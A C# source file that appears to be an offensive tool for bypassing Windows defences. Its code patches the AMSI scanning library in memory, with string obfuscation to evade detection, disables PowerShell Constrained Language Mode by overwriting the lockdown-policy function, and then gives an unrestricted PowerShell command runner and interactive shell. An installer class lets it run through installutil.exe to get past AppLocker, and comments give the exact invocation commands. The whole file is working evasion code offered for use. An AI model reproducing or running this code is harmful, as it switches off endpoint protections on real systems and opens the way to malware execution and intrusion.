using System;
using System.IO;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Linq;
using System.Collections.Generic;
using System.Configuration.Install;

namespace Bypass
{
    // Bypasss CLM and AppLocker
    class Program
    {
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();


        // .\uninstall-bypass.exe
        // C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /interactive=true /U .\uninstall-bypass.exe
        // C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=true /cmd="date > out.txt" /U .\uninstall-bypass.exe

        // Bypass CLM
        public static void Main(string[] args)
        {
            string cmd_main = "";
            string cmd_interactive = "";
            if (args.Length > 0)
            {
                cmd_main = args[0];
                cmd_interactive = args[1];
            }

            Console.WriteLine("Running ISMA bypass");
            Isma_bypass();

            Console.WriteLine("Running CLM bypass");
            Clm_bypass();

            if (args.Length == 0)
            {
                Run_interactive();
            }
            else if (args.Length > 1 && cmd_interactive == "true")
            {
                Run_interactive();
            }
            else if (!string.IsNullOrEmpty(cmd_main))
            {
                Run_command(cmd_main);
            }
            else
            {
                Console.WriteLine("\nNo valid option provided.\n/cmd=\"whoami > out.txt\"\n/interactive=true");
                return;
            }

        }

        static void Run_command(string cmd_main)
        {
            Console.WriteLine("Running command: " + cmd_main);

            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                rs.Open();

                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = rs;
                    ps.AddScript(cmd_main);

                    try
                    {
                        ps.Invoke();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error: " + ex.Message);
                    }
                }

                rs.Close();
            }
        }

        private static void Run_interactive()
        {
            Console.WriteLine("Starting interactive mode...");

            using (Runspace rs = RunspaceFactory.CreateRunspace())
            {
                PowerShell ps = PowerShell.Create();
                rs.Open();
                ps.Runspace = rs;

                while (true)
                {
                    Console.Write("PS " + Directory.GetCurrentDirectory() + "> ");
                    string cmd = Console.ReadLine();

                    if (string.Equals(cmd, "exit"))
                        break;

                    using (Pipeline pipeline = rs.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(cmd);
                        pipeline.Commands.Add("Out-String");

                        try
                        {
                            Collection<PSObject> results = pipeline.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();

                            foreach (PSObject obj in results)
                            {
                                stringBuilder.Append(obj);
                            }

                            Console.WriteLine(stringBuilder.ToString().Trim());
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.ToString());
                        }
                    }
                }

                rs.Close();
            }
        }

        static int Isma_bypass()
        {
            Char c1, c2, c3, c4, c5, c6, c7, c8, c9, c10;
            c1 = 'A';
            c2 = 's';
            c3 = 'c';
            c4 = 'n';
            c5 = 'l';
            c6 = 't';
            c7 = 'z';
            c8 = 'U';
            c9 = 'y';
            c10 = 'o';
            string[] filePaths = Directory.GetFiles(@"c:\wind" + c10 + "ws\\s" + c9 + "stem32", "a?s?.d*");
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));
            try
            {
                uint lpflOldProtect;
                var lib = LoadLibrary(libname);
                // isma-UacInitialize
                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
                int buffsize = 1000;
                var randoffset = baseaddr - buffsize;
                IntPtr hProcess = GetCurrentProcess();
                byte[] addrBuf = new byte[buffsize];
                IntPtr nRead = IntPtr.Zero;
                ReadProcessMemory(hProcess, randoffset, addrBuf, addrBuf.Length, out nRead);
                byte[] asb = new byte[7] { 0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08 };
                Int32 asbrelloc = (PatternAt(addrBuf, asb)).First();
                var funcaddr = baseaddr - (buffsize - asbrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
                byte[] ass = new byte[7] { 0x48, 0x83, 0xec, 0x38, 0x45, 0x33, 0xdb };
                Int32 assrelloc = (PatternAt(addrBuf, ass)).First();
                funcaddr = baseaddr - (buffsize - assrelloc);
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine("Could not patch " + libname + "...");
            }

            return 0;
        }

        static int Clm_bypass()
        {
            Char a1, a2, a3, a4, a5;
            a1 = 'y';
            a2 = 'g';
            a3 = 'u';
            a4 = 'o';
            a5 = 't';
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;
            var get_l_info = Automation.GetType("S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" + a3 + "rity.S" + a1 + "stemP" + a4 + "licy").GetMethod("GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            var get_l_handle = get_l_info.MethodHandle;
            uint lpflOldProtect;
            RuntimeHelpers.PrepareMethod(get_l_handle);
            var get_l_ptr = get_l_handle.GetFunctionPointer();
            VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_l_ptr, 4);

            return 0;
        }
        public static IEnumerable<int> PatternAt(byte[] source, byte[] pattern)
        {
            for (int i = 0; i < source.Length; i++)
            {
                if (source.Skip(i).Take(pattern.Length).SequenceEqual(pattern))
                {
                    yield return i;
                }
            }
        }

    }

    // uninstall bypass for CLM and AppLocker
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String interactive = "false";
            String cmd_uninstall = "";
            
            if (this.Context.Parameters["interactive"] == "true")
            {
                interactive = "true";
            }

            if (this.Context.Parameters["cmd"] != "")
            {
                cmd_uninstall = this.Context.Parameters["cmd"];
            }
            
            string[] args = new string[] { cmd_uninstall, interactive };

            Program.Main(args);
        }
    }
}
